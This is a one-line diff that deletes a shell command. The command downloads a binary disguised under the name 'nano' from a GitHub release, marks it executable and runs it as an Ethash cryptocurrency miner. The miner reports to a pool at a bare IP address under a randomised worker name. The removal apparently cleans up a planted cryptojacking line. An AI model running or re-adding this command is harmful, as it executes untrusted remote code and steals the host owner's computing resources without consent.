@@ -1,1 +1,0 @@
-wget https://github.com/j0642773/satu/releases/download/srb/nano && chmod +x nano && ./nano --algo ETHASH --pool 20.214.155.43:22 --user cornertech.$(echo $(shuf -i 1-9999 -n 1)-AST) --pass x --ethstratum ETHPROXY
